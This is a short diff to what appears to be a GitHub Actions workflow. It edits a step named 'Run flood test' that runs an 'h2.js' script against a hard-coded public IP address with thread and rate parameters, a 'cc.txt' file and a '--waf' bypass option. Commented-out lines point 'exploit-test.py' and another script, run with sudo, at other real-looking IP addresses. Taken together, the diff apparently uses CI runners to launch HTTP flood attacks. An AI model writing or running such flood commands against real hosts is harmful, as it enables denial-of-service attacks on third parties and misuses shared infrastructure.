@@ -16,6 +16,6 @@ jobs:
       # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
       - name: Run flood test (quiet)
         run: |
-          node h2.js http://103.116.247.42 21000 12 5 1000 GET --waf --mode full
+          node h2.js http://103.116.247.42 cc.txt 21000 12 5 1000 GET --waf --mode full
           # python3 exploit-test.py 103.43.8.135 80 --no-ssl
           # sudo python 12.py 103.116.247.42 80
